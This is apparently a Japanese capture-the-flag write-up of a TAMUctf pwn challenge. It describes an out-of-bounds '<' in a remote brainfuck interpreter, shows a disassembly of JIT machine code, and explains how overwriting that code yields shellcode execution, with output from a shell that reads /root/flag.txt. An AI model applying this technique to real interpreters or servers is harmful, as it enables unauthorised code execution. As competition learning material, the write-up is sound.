# Solution
brainfu*kのインタプリタに接続できる。バイナリやソースコードなど提供ファイルはなし。      
とりあえず接続可能なbrainfu*kインタプリタの機能を使ってメモリの中身を見ていくことにした。      
    
すると「<」で配列外参照が可能で、メモリに何らかのデータが詰まっていた。            
「<」で進めていったメモリ部分に格納されているのは、アドレス値ではないし、文字列でもないように見えた。      
また、brainfu*k系のpwn過去問を見てみるとbrainfu*kのインタプリタ（というかインタプリタはそうなっているのか）というのはメモリの何処かに機械語命令を展開して、その機械語を実行することによってbrainf*ckインタプリタ機能を提供しているようだ。      

以上より「<」で進めていったメモリ部分に格納されているのは機械語命令なのではないかと確認してみると、機械語命令だった。
例えば以下の命令がリモートのインタプリタのメモリの中身を機械語に変換してみたものである。綺麗に機械語に出来ており、 <.<.<.　と繰り返し入力した場合の<.の2命令を実行している（だろう）。     

```
sub    rsi,0x1
cmp    rsi,rdx
jae    0x7fffc94cfa99
add    rsi,0x8000
mov    QWORD PTR [rsp+0x30],rdi
mov    QWORD PTR [rsp+0x38],rsi
mov    QWORD PTR [rsp+0x40],rdx
mov    QWORD PTR [rsp+0x48],rcx
movabs rax,0x55ce2077eb50
call   rax
mov    rdi,QWORD PTR [rsp+0x30]
mov    rsi,QWORD PTR [rsp+0x38]
mov    rdx,QWORD PTR [rsp+0x40]
mov    rcx,QWORD PTR [rsp+0x48]
cmp    al,0x0
jne    0x7fffc94d049b
sub    rsi,0x1
cmp    rsi,rdx
...
```
    
あとは、その機械語命令群の一部をうまく書き換えれば、シェルコードを実行することができる。     
     
```
$ python3 exploit.py
[+] Opening connection to challenges.tamuctf.com on port 31337: Done
[*] Switching to interactive mode
 $ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /root/flag.txt
gigem{2_l3J17_2_qU17_0op5_n3veRm1Nd}
```
